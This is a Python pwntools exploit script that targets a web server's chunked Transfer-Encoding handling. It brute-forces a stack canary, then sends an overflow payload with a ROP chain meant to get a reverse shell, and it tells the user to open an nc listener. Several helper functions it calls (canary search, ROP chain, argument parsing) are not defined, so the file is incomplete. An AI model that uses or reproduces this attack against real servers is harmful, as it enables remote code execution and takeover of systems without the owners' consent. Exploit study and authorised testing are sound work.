# -*- coding: utf-8 -*-
from __future__ import print_function
from pwn import *
import argparse
import struct
import time
import sys

CANARY_OFFSET = 5066
SHELLCODE_LOCATION = 0x684000

base_payload = """
GET / HTTP/1.1
Host: 127.0.0.1
Transfer-Encoding: chunked\r\n\r\n"""
#
def pad(shellcode):
    while len(shellcode) % 8 != 0:
        shellcode += "\x90"
    return shellcode + ("\x90" * 8)

def HexToByte(hexStr):
    hexStr = hexStr.replace('\\x', '')

    bytes_ = []
    for i in range(0, len(hexStr), 2):
        bytes_.append(chr(int(hexStr[i:i+2], 16)))
    return "".join(bytes_)

def get_stack_len(args):
    result = []
    for i in range(2000):
        ps = connect(args.remoteadress, args.remoteport)
        ps.send(base_payload + 'A' * (4096+i))
        try:
                ps.recv(1024)
                print("i = %s none"% str(i))
        except:
                print(i)
                ps.close()

def main():
    context.update(arch='amd64', os='linux')
    context.log_level = 'error'
    args = add_arguments()
    # get_stack_len(args)
    print('[!] Start nc listener on your host machine using this command: "nc -vvvlp %s"' % str(args.listenerport))

    if args.canary:
        canary = HexToByte(args.canary)
        print('[+] Using user-supplied canary: "%s"' % ByteToHex(canary))
    else:
        print('[?] Bruteforcing canary')
        canary = find_canary(args)
        print('[+] Found canary: "%s"' % ByteToHex(canary))

    ps = connect(args.remoteadress, args.remoteport)

    print('[?] Trying to build rop chain...')

    chain = rop_chain(args)
    ps.send(base_payload + 'A' * CANARY_OFFSET + canary + chain)

    print('[!] Completed! Check your listener... (If nothing happened, try restarting the exploit)')

    # ps.interactive()
    ps.recv(1024)

if __name__ == "__main__":
    main()